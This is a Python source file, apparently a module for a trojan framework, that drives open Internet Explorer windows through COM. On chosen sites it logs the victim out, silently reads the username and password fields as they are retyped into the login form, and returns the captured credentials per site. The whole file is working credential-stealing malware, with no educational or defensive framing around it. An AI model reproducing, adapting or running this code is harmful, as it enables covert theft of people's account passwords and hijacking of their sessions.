import win32com.client
import time
import urllib

LOGOUT_URL  = "logout_url"
LOGOUT_FORM = "logout_form"
LOGIN_INDEX = "login_form_index"
PASSW_INPUT = "pass_fname"
USERN_INPUT = "user_fname"
BOOL_OWNED  = "owned"

clsid = '{9BA05972-F6A8-11CF-A442-00A0C90A8F39}'
windows = win32com.client.Dispatch(clsid)


def make_site(logout_url, logout_form, pass_fname, user_fname, login_form_index=0, **_):
    return {
        LOGOUT_URL : logout_url,
        LOGOUT_FORM: logout_form,
        LOGIN_INDEX: login_form_index,
        PASSW_INPUT: pass_fname,
        USERN_INPUT: user_fname,
        BOOL_OWNED : False
        }


def wait_for_browser(browser):
    while browser.ReadyState != 4 and browser.ReadyState != 'complete':
        time.sleep(0.1)


def iter_tabs(target_sites):
    passw = {}
    for browser in windows:
        url = urllib.parse.urlparse(browser.LocationUrl)
        if url.hostname in target_sites:
            if target_sites[url.hostname][BOOL_OWNED]:
                continue
            if target_sites[url.hostname][LOGOUT_URL]:
                browser.Navigate(target_sites[url.hostname][LOGOUT_URL])
                wait_for_browser(browser)
            else:
                full_doc = browser.Document.all
                for i in full_doc:
                    try:
                        if i.id == target_sites[url.hostname][LOGOUT_FORM]:
                            i.submit()
                            wait_for_browser(browser)
                    except:
                        pass
            try:
                login_index = target_sites[url.hostname][LOGIN_INDEX]
                login_page = urllib.parse.quote(browser.LocationUrl)
                felem = browser.Document.forms[login_index]
                pass_, usr = [f for f in felem if f.name == target_sites[url.hostname][PASSW_INPUT] or f.name == target_sites[url.hostname][USERN_INPUT]]
                psval, usrval = pass_.value, usr.value
                while browser.ReadyState == 4 or browser.ReadyState == 'complete':
                    psval, usrval = pass_.value, usr.value
                passw[url.hostname] = {"login": usrval, "password": psval}
                target_sites[url.hostname][BOOL_OWNED] = True
            except Exception as e:
                passw[url.hostname] = {"error":str(e)}
                pass
            time.sleep(5)
    return passw  

def run(**args):
    if 'sites' not in args:
        return
    sites = {}
    for site in args['sites']:
        sites[site] = make_site(**args['sites'][site])
    return iter_tabs(sites)
